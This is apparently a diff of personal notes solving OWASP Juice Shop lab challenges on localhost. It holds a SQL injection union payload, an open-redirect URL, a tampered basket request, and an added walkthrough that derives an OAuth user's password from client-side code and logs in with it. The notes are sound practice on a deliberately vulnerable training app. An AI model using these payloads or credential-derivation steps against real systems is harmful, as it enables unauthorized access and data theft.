@@ -270,7 +270,7 @@ http://localhost:3000/redirect?to=http://kimminich.de?pwned=https://github.com/b
 burp suite > proxy > repeater<br>
 GET /rest/products/search?q=apple'))union%20select%20id,name,description,price,deluxePrice,image,createdAt,updatedAt,deletedAt%20from%20Products-- HTTP/1.1<br>
 POST /api/BasketItems/ HTTP/1.1
-{"ProductId":24,"BasketId":"10","quantity":1}
+{"ProductId":10,"BasketId":"1","quantity":1}
 
 
 ### Ephemeral Accountant
@@ -282,3 +282,19 @@ burp suite > proxy > repeater <br>
 firefox > Debugger<br>
 search: discount > WMNSDY2023<br>
 bash > timedatectl set-ntp 0 > timedatectl set-time '2019-03-08' <br>
+
+### Login Bjoern
+firefox > Debugger > search: oauth <br>
+bash > cat main1.js | grep password:
+password: btoa(e.email.split("").reverse().join("")),
+email: bjoern.kimminich@gmail.com
+moc.liamg@hcinimmik.nreojb
+bash > echo -n moc.liamg@hcinimmik.nreojb | base64
+bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=
+http://localhost:3000/#/login
+POST /rest/user/login HTTP/1.1
+{"email":"bjoern.kimminich@gmail.com","password":"bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI="}
+
+
+
+
